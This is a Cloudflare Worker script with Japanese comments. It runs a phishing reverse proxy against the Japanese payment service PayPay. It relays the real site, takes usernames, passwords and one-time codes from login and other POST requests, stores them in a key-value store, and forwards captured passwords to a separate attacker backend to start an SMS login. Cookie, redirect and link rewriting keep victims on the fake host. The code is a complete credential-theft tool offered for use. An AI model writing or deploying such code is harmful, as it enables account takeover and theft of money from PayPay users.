// Cloudflare Worker — reverse proxy to PayPay + credential store
// KV binding: CREDS
// Deploy: wrangler deploy
//
// 本物の www.paypay.ne.jp を中継。
// JS 解析結果: ログインは POST /app/v1/oauth/token (grant_type=password or otp)
// password grant をキャプチャしたら Flask の /api/worker_capture に通知して SMS フローを開始させる。

const TARGET_ORIGIN = "https://www.paypay.ne.jp";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const workerHost = url.host;

    const secret = (env.SECRET || "").trim();
    if (secret && request.headers.get("X-Secret") === secret && request.method === "POST") {
      return handleStore(request, env);
    }

    return proxy(request, env, workerHost);
  },
};

async function proxy(request, env, workerHost) {
  const url = new URL(request.url);
  const targetUrl = TARGET_ORIGIN + url.pathname + url.search;

  const headers = new Headers(request.headers);
  headers.set("Host", "www.paypay.ne.jp");
  headers.delete("cf-connecting-ip");
  headers.delete("cf-ray");
  headers.delete("cf-visitor");

  let body = request.body;
  let captured = null;

  if ((request.method === "POST" || request.method === "PUT") && url.pathname.includes("/oauth/token")) {
    const clone = request.clone();
    try {
      const text = await clone.text();
      body = text;

      let parsed = {};
      try { parsed = JSON.parse(text); } catch {
        const params = new URLSearchParams(text);
        for (const [k, v] of params) parsed[k] = v;
      }

      captured = {
        type: "oauth_token",
        path: url.pathname,
        grant_type: parsed.grant_type || null,
        username: parsed.username || parsed.phone || null,
        password: parsed.password || null,
        otp: parsed.otp || null,
        otp_prefix: parsed.otp_prefix || null,
        scope: parsed.scope || null,
        client_uuid: parsed.client_uuid || null,
        raw: text.slice(0, 1500),
        ts: new Date().toISOString(),
        ua: request.headers.get("User-Agent") || "",
      };

      const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
      await env.CREDS.put(key, JSON.stringify(captured));

      // password grant なら Flask に通知してログインを試みる
      if (captured.grant_type === "password" && captured.username && captured.password && env.FLASK_BACKEND_URL) {
        try {
          await fetch(env.FLASK_BACKEND_URL.replace(/\/$/, "") + "/api/worker_capture", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              username: captured.username,
              password: captured.password,
            }),
          });
        } catch {}
      }
    } catch {
      // ignore parse error
    }
  } else if (request.method === "POST" || request.method === "PUT") {
    const clone = request.clone();
    try {
      const text = await clone.text();
      if (text && (text.includes("password") || text.includes("username") || text.includes("otp"))) {
        const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
        await env.CREDS.put(key, JSON.stringify({
          type: "captured_post",
          path: url.pathname,
          body: text.slice(0, 1500),
          ts: new Date().toISOString(),
        }));
      }
      body = text;
    } catch {}
  }

  const res = await fetch(targetUrl, {
    method: request.method,
    headers,
    body: (request.method !== "GET" && request.method !== "HEAD") ? body : undefined,
    redirect: "manual",
  });

  const newHeaders = new Headers(res.headers);

  const setCookies = newHeaders.getAll("set-cookie") || [];
  newHeaders.delete("set-cookie");
  for (const c of setCookies) {
    const rewritten = c
      .replace(/Domain=[^;]+/gi, `Domain=${workerHost}`)
      .replace(/domain=[^;]+/gi, `domain=${workerHost}`);
    newHeaders.append("set-cookie", rewritten);
  }

  const loc = newHeaders.get("location");
  if (loc && loc.includes("paypay.ne.jp")) {
    newHeaders.set("location", loc.replace(/https?:\/\/[^/]*paypay\.ne\.jp/g, `https://${workerHost}`));
  }

  const contentType = newHeaders.get("content-type") || "";
  if (contentType.includes("text/html")) {
    let html = await res.text();
    html = html.replace(/https?:\/\/[^"'\s]*paypay\.ne\.jp/g, (m) =>
      m.replace(/https?:\/\/[^/]*paypay\.ne\.jp/, `https://${workerHost}`)
    );
    return new Response(html, { status: res.status, headers: newHeaders });
  }

  return new Response(res.body, { status: res.status, headers: newHeaders });
}

async function handleStore(request, env) {
  let body;
  try { body = await request.json(); } catch { body = {}; }
  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
  await env.CREDS.put(key, JSON.stringify(body));
  return json({ ok: true, key });
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data, null, 2), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}
